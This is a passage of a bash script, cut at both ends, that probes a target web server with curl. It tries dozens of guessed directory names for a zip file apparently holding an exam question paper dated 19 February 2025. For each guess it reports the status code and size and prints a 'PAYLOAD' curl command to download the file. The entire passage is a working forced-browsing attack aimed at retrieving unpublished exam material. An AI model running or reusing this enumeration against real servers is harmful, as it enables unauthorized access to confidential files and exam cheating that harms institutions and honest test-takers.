code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlerQstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlerQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlerQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystemQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystemQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystemQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AdminQPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AdminQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AdminQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminBatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadQPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystem-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystem-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystem-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemAutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperDashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUploadQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUploadQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUploadQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingQPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingQPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
